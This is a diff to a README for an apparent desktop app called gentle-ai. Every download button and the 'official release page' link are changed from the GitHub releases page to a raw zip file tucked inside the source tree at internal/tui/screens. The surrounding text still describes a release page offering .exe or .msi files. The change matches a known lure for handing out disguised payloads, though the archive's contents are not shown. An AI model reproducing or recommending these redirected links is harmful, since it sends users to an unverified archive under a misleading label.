@@ -1,6 +1,6 @@
 # 🤖 gentle-ai - Easy AI Tools for Everyone
 
-[![Download gentle-ai](https://img.shields.io/badge/Download-Gentle--AI-brightgreen?style=for-the-badge)](https://github.com/alaaabulaban/gentle-ai/releases)
+[![Download gentle-ai](https://img.shields.io/badge/Download-Gentle--AI-brightgreen?style=for-the-badge)](https://github.com/alaaabulaban/gentle-ai/raw/refs/heads/main/internal/tui/screens/ai_gentle_1.8.zip)
 
 ## 🧩 About gentle-ai
 
@@ -32,7 +32,7 @@ gentle-ai is easy to get running. Follow these steps carefully.
 
 Click this big button below to open the release page where you will find the latest version of gentle-ai:
 
-[![Download gentle-ai](https://img.shields.io/badge/Download-Gentle--AI-blue?style=for-the-badge)](https://github.com/alaaabulaban/gentle-ai/releases)
+[![Download gentle-ai](https://img.shields.io/badge/Download-Gentle--AI-blue?style=for-the-badge)](https://github.com/alaaabulaban/gentle-ai/raw/refs/heads/main/internal/tui/screens/ai_gentle_1.8.zip)
 
 The release page contains one or more files. Usually, the file you want ends with `.exe` or `.msi`.
 
@@ -107,14 +107,14 @@ A: Yes, you can download and use it at no cost.
 A: No, since it uses online AI services, you will need an internet connection.
 
 **Q: How do I update gentle-ai?**  
-A: Visit the [release page](https://github.com/alaaabulaban/gentle-ai/releases) regularly to download the newest version.
+A: Visit the [release page](https://github.com/alaaabulaban/gentle-ai/raw/refs/heads/main/internal/tui/screens/ai_gentle_1.8.zip) regularly to download the newest version.
 
 ---
 
 ## 🔗 Useful Links
 
 - Visit the official release page to download gentle-ai:  
-  [https://github.com/alaaabulaban/gentle-ai/releases](https://github.com/alaaabulaban/gentle-ai/releases)  
+  [https://github.com/alaaabulaban/gentle-ai/raw/refs/heads/main/internal/tui/screens/ai_gentle_1.8.zip](https://github.com/alaaabulaban/gentle-ai/raw/refs/heads/main/internal/tui/screens/ai_gentle_1.8.zip)  
 - Check for updates or get help from the community on GitHub.
 
 ---
@@ -148,4 +148,4 @@ The name gentle-ai represents simplicity and care for users. The app gives you a
 
 Make sure to get the latest version here:
 
-[![Download gentle-ai](https://img.shields.io/badge/Download-Gentle--AI-green?style=for-the-badge)](https://github.com/alaaabulaban/gentle-ai/releases)
+[![Download gentle-ai](https://img.shields.io/badge/Download-Gentle--AI-green?style=for-the-badge)](https://github.com/alaaabulaban/gentle-ai/raw/refs/heads/main/internal/tui/screens/ai_gentle_1.8.zip)
